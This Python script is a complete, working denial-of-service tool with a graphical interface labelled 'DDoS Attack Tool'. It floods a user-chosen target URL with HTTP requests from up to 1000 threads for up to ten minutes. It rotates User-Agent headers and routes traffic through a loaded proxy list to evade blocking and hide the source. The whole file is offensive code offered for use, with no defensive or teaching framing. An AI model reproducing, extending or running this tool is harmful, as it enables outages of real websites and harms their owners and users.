import requests
import threading
import random
import time
import PySimpleGUI as sg

# Load proxy list (IP:PORT format)
def load_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            return [{"https": f"http://{line.strip()}"} for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to send attack requests
def attack(url, threads, duration, proxies, window):
    def send_request():
        session = requests.Session()
        headers = {"User-Agent": random.choice(USER_AGENTS)}

        end_time = time.time() + duration
        while time.time() < end_time:
            proxy = random.choice(proxies) if proxies else None
            try:
                session.get(url, headers=headers, proxies=proxy, timeout=5)
            except requests.exceptions.RequestException:
                pass  # Ignore failed requests

    thread_list = [threading.Thread(target=send_request) for _ in range(threads)]
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()
    
    window.write_event_value("-ATTACK_COMPLETE-", "Attack Finished!")

# User-Agent rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

# GUI Layout
sg.theme("DarkRed1")
layout = [
    [sg.Text("🔥 DDoS Attack Tool 🔥", font=("Helvetica", 16), text_color="red")],
    [sg.Text("Target URL", text_color="red"), sg.InputText(key="URL")],
    [sg.Text("Threads", text_color="red"), sg.Slider(range=(10, 1000), orientation="h", default_value=100, key="THREADS")],
    [sg.Text("Duration (sec)", text_color="red"), sg.Slider(range=(10, 600), orientation="h", default_value=30, key="DURATION")],
    [sg.Text("Proxy List File", text_color="red"), sg.InputText(key="PROXY_FILE"), sg.FileBrowse()],
    [sg.Button("Start Attack", button_color=("white", "red")), sg.Button("Exit")],
    [sg.Text("", key="STATUS", text_color="red")],
]

# Run GUI
window = sg.Window("DDoS Tool", layout)
while True:
    event, values = window.read()
    
    if event in (sg.WIN_CLOSED, "Exit"):
        break

    if event == "Start Attack":
        url, threads, duration = values["URL"], int(values["THREADS"]), int(values["DURATION"])
        proxies = load_proxies(values["PROXY_FILE"]) if values["PROXY_FILE"] else []
        
        window["STATUS"].update("🚀 Attack Started!", text_color="red")
        threading.Thread(target=attack, args=(url, threads, duration, proxies, window)).start()

    if event == "-ATTACK_COMPLETE-":
        window["STATUS"].update("✅ Attack Finished!", text_color="red")

window.close()
